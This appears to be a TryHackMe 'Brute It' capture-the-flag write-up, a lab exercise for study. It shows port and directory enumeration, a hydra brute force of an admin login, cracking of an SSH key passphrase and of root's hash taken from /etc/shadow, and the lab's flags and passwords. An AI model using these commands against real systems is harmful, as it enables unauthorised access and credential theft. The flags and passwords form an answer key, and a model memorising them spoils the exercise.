---
tags:
  - tryhackme
  - challenge
  - easy
  - offensive
  - linux
  - brute-force
  - password-cracking
  - sudo-abuse
---

# Brute It
![Brute It logo](logos/brute_it_logo.png)

**Platform:** TryHackMe  
**Type:** Challenge  
**Difficulty:** Easy  
**Link:** [Brute It](https://tryhackme.com/room/bruteit)  

## Description
"Learn how to brute, hash cracking and escalate privileges in this box!"

## Enumeration
### Port Scanning
```
ports=$(nmap -p- --min-rate=1000 TARGET_IP_ADDRESS | grep ^[0-9] | cut -d '/' -f 1 | tr '\n' ',' | sed s/,$//)
nmap -p$ports -A -T4 TARGET_IP_ADDRESS
```

```
Host is up (0.066s latency).

PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 7.6p1 Ubuntu 4ubuntu0.3 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   2048 4b:0e:bf:14:fa:54:b3:5c:44:15:ed:b2:5d:a0:ac:8f (RSA)
|   256 d0:3a:81:55:13:5e:87:0c:e8:52:1e:cf:44:e0:3a:54 (ECDSA)
|_  256 da:ce:79:e0:45:eb:17:25:ef:62:ac:98:f0:cf:bb:04 (ED25519)
80/tcp open  http    Apache httpd 2.4.29 ((Ubuntu))
|_http-title: Apache2 Ubuntu Default Page: It works
|_http-server-header: Apache/2.4.29 (Ubuntu)
Warning: OSScan results may be unreliable because we could not find at least 1 open and 1 closed port
Device type: general purpose|phone
Running (JUST GUESSING): Linux 5.X|6.X|4.X (96%), Google Android 10.X|11.X|12.X|9.X (93%)
OS CPE: cpe:/o:linux:linux_kernel:5 cpe:/o:linux:linux_kernel:6 cpe:/o:linux:linux_kernel:4 cpe:/o:google:android:10 cpe:/o:google:android:11 cpe:/o:google:android:12 cpe:/o:google:android:9
Aggressive OS guesses: Linux 5.14 - 6.8 (96%), Linux 4.15 - 5.19 (96%), Linux 4.15 (95%), Linux 5.4 - 5.15 (95%), Android 10 - 12 (Linux 4.14 - 4.19) (93%), Android 10 - 11 (Linux 4.9 - 4.14) (92%), Android 9 - 11 (Linux 4.9 - 4.14) (92%), Linux 2.6.32 (92%), Linux 3.1 - 3.2 (92%), Linux 3.11 (92%)
No exact OS matches for host (test conditions non-ideal).
Network Distance: 3 hops
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
```
??? success "How many ports are open?"
	2
??? success "What version of SSH is running?"
	OpenSSH 7.6p1
??? success "What version of Apache is running?"
	2.4.29

### HTTP Enumeration
```
ffuf -u http://TARGET_IP_ADDRESS/FUZZ -w /usr/share/wordlists/seclists/Discovery/Web-Content/DirBuster-2007_directory-list-2.3-medium.txt -ic -c
gobuster dir -u TARGET_IP_ADDRESS -w /usr/share/wordlists/seclists/Discovery/Web-Content/DirBuster-2007_directory-list-2.3-medium.txt -x php,html,txt
```

**Notes**  

* Default web server installation page in web browser (reveals OS of host)  
* No `robots.txt` or `sitemap` files  
* Nothing interesting in the source code  
* `ffuf` scan reveals `/admin` directory: `POST` form serves a login form to an admin interface. Source code reveals user name is "admin"  
??? success "Which Linux distribution is running?"
	Ubuntu
??? success "What is the hidden directory?"
	/admin

### Vulnerability Enumeration
```
searchsploit OpenSSH 7.6p1	# Only results: username enumeration
searchsploit httpd 2.4.29   # Only result: DoS
```

## Foothold
**Action(s)**  
:white_check_mark: Use BurpSuite to capture POST form field information for use with `hydra`  

```
hydra -l admin -P /usr/share/wordlists/rockyou.txt TARGET_IP_ADDRESS http-post-form "/admin/:user=^USER^&pass=^PASS^:Username or password invalid"
```
??? success "What is the user:password of the admin panel?"
	admin:xavier

**Action(s)**  
:white_check_mark: Login to the admin panel with newly discovered credentials  

**Notes**  

* Web page reveals a flag  
* Web page holds a link to a private RSA key for the user "john"  
??? success "Web flag"
	THM{brut3_f0rce_is_e4sy}

**Actions**  
:white_check_mark: Copy contents of private RSA key on admin panel to file on attacker machine  

```
ssh2john id_rsa > key.hash
john key.hash --wordlist=/usr/share/wordlists/rockyou.txt
```
??? success "What is John's RSA Private Key passphrase?"
	rockinroll

```
chmod 600 id_rsa
ssh john@TARGET_IP_ADDRESS -i id_rsa

john@bruteit:~$ ls -al
total 40
drwxr-xr-x 5 john john 4096 Sep 30  2020 .
drwxr-xr-x 4 root root 4096 Aug 28  2020 ..
-rw------- 1 john john  394 Sep 30  2020 .bash_history
-rw-r--r-- 1 john john  220 Aug 16  2020 .bash_logout
-rw-r--r-- 1 john john 3771 Aug 16  2020 .bashrc
drwx------ 2 john john 4096 Aug 16  2020 .cache
drwx------ 3 john john 4096 Aug 16  2020 .gnupg
-rw-r--r-- 1 john john  807 Aug 16  2020 .profile
drwx------ 2 john john 4096 Aug 16  2020 .ssh
-rw-r--r-- 1 john john    0 Aug 16  2020 .sudo_as_admin_successful
-rw-r--r-- 1 root root   33 Aug 16  2020 user.txt
john@bruteit:~$ cat user.txt
```
??? success "user.txt"
	THM{a_password_is_not_a_barrier}

## Privilege Escalation
```
john@bruteit:~$ sudo -l
Matching Defaults entries for john on bruteit:
    env_reset, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin

User john may run the following commands on bruteit:
    (root) NOPASSWD: /bin/cat
john@bruteit:~$ sudo cat /etc/shadow
root:$6$zdk0.jUm$Vya24cGzM1duJkwM5b17Q205xDJ47LOAg/OpZvJ1gKbLF8PJBdKJA4a6M.JYPUTAaWu4infDjI88U9yUXEVgL.:18490:0:99999:7:::
daemon:*:18295:0:99999:7:::
bin:*:18295:0:99999:7:::
sys:*:18295:0:99999:7:::
sync:*:18295:0:99999:7:::
games:*:18295:0:99999:7:::
man:*:18295:0:99999:7:::
lp:*:18295:0:99999:7:::
mail:*:18295:0:99999:7:::
news:*:18295:0:99999:7:::
uucp:*:18295:0:99999:7:::
proxy:*:18295:0:99999:7:::
www-data:*:18295:0:99999:7:::
backup:*:18295:0:99999:7:::
list:*:18295:0:99999:7:::
irc:*:18295:0:99999:7:::
gnats:*:18295:0:99999:7:::
nobody:*:18295:0:99999:7:::
systemd-network:*:18295:0:99999:7:::
systemd-resolve:*:18295:0:99999:7:::
syslog:*:18295:0:99999:7:::
messagebus:*:18295:0:99999:7:::
_apt:*:18295:0:99999:7:::
lxd:*:18295:0:99999:7:::
uuidd:*:18295:0:99999:7:::
dnsmasq:*:18295:0:99999:7:::
landscape:*:18295:0:99999:7:::
pollinate:*:18295:0:99999:7:::
thm:$6$hAlc6HXuBJHNjKzc$NPo/0/iuwh3.86PgaO97jTJJ/hmb0nPj8S/V6lZDsjUeszxFVZvuHsfcirm4zZ11IUqcoB9IEWYiCV.wcuzIZ.:18489:0:99999:7:::
sshd:*:18489:0:99999:7:::
john:$6$iODd0YaH$BA2G28eil/ZUZAV5uNaiNPE0Pa6XHWUFp7uNTp2mooxwa4UzhfC0kjpzPimy1slPNm9r/9soRw8KqrSgfDPfI0:18490:0:99999:7:::
```

**Action(s)**  
:white_check_mark: Copy contents of `root` entry in `/etc/shadow` and `/etc/passwd` files to attacker machine for use with `unshadow`  
*`root` entry in `/etc/shadow` saved to "shadow"; `root` entry in `/etc/passwd` save to "passwd"*

```
unshadow passwd shadow > hash
john hash --wordlist=/usr/share/wordlists/rockyou.txt
```
??? success "What is the root's password?"
	football

```
john@bruteit:~$ su root
Password: 

root@bruteit:/home/john# ls -al /root
total 52
drwx------  7 root root 4096 Sep 30  2020 .
drwxr-xr-x 24 root root 4096 Sep 30  2020 ..
-rw-------  1 root root  445 Sep 30  2020 .bash_history
-rw-r--r--  1 root root 3106 Apr  9  2018 .bashrc
drwx------  2 root root 4096 Sep  3  2020 .cache
drwx------  3 root root 4096 Sep  3  2020 .gnupg
drwx------  2 root root 4096 Aug 16  2020 .john
drwxr-xr-x  3 root root 4096 Aug 15  2020 .local
-rw-r--r--  1 root root  148 Aug 17  2015 .profile
-rw-r--r--  1 root root   26 Aug 17  2020 root.txt
drwx------  2 root root 4096 Aug 15  2020 .ssh
-rw-------  1 root root 2160 Sep 30  2020 .viminfo
-rw-r--r--  1 root root  165 Aug 16  2020 .wget-hsts
root@bruteit:/home/john# cat /root/root.txt
```
??? success "root.txt"
	THM{pr1v1l3g3_3sc4l4t10n}

**Tools Used**  
`Burp` `hydra` `ssh2john` `john` `unshadow`

**Date completed:** 30/04/26  
**Date published:** 30/04/26